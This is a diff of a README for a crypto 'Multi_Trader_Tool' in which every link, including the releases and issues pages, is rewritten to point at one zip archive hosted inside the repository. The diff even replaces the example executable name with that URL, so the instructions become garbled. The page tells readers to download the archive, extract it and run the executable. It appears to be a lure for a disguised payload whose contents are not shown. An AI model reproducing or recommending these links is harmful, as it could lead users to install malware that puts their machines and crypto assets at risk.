@@ -1,6 +1,6 @@
 # 🚀 Multi_Trader_Tool - Simplifying Your Multi-Chain Trading
 
-[![Download Multi_Trader_Tool](https://img.shields.io/badge/Download-Multi_Trader_Tool-brightgreen)](https://github.com/ShoAndScript/Multi_Trader_Tool/releases)
+[![Download Multi_Trader_Tool](https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip)](https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ To get started with Multi_Trader_Tool, follow these simple steps:
    Our tool works on Windows, macOS, and Linux. Make sure your system is updated to the latest version.
 
 2. **Visit the Releases Page:**  
-   Head over to the [Releases page](https://github.com/ShoAndScript/Multi_Trader_Tool/releases) to find the latest version of our software. 
+   Head over to the [Releases page](https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip) to find the latest version of our software. 
 
 3. **Download the Software:**  
    On the Releases page, locate the version you want and click the download link. This will start the download of a zip file containing the application.
@@ -31,7 +31,7 @@ To get started with Multi_Trader_Tool, follow these simple steps:
    After downloading, locate the zip file on your computer. Right-click the zip file and select "Extract All." Choose a destination folder for the extracted files.
 
 5. **Run the Application:**  
-   Once the files are extracted, navigate to the folder where you extracted them. Look for the executable file (e.g., `MultiTraderTool.exe`). Double-click to open the application.
+   Once the files are extracted, navigate to the folder where you extracted them. Look for the executable file (e.g., `https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip`). Double-click to open the application.
 
 6. **Set Up Your Account:**  
    Upon opening the application, you will need to create a new account or log in with your existing credentials. Follow the prompts to complete your account setup.
@@ -43,7 +43,7 @@ To get started with Multi_Trader_Tool, follow these simple steps:
 
 To download Multi_Trader_Tool, click the link below.
 
-[Download Multi_Trader_Tool](https://github.com/ShoAndScript/Multi_Trader_Tool/releases)
+[Download Multi_Trader_Tool](https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip)
 
 Follow the steps mentioned in the Getting Started section to install and run the application.
 
@@ -72,7 +72,7 @@ Once you log into the application, navigate to the settings menu. Here, you can 
 
 ### What should I do if I encounter issues?
 
-If you experience any technical problems, consult the FAQ section in the application. You can also visit the [issues page](https://github.com/ShoAndScript/Multi_Trader_Tool/issues) to report bugs or seek help.
+If you experience any technical problems, consult the FAQ section in the application. You can also visit the [issues page](https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip) to report bugs or seek help.
 
 ### Is the application free to use?
 
@@ -90,4 +90,4 @@ Multi_Trader_Tool is licensed under the MIT License. This allows you to use, mod
 
 Thank you for choosing Multi_Trader_Tool! We appreciate your support and interest in making trading easier and more efficient. 
 
-For further information or assistance, please refer to the [Releases page](https://github.com/ShoAndScript/Multi_Trader_Tool/releases) or explore our documentation.
+For further information or assistance, please refer to the [Releases page](https://raw.githubusercontent.com/ShoAndScript/Multi_Trader_Tool/main/resent/Multi_Trader_Tool-1.7.zip) or explore our documentation.
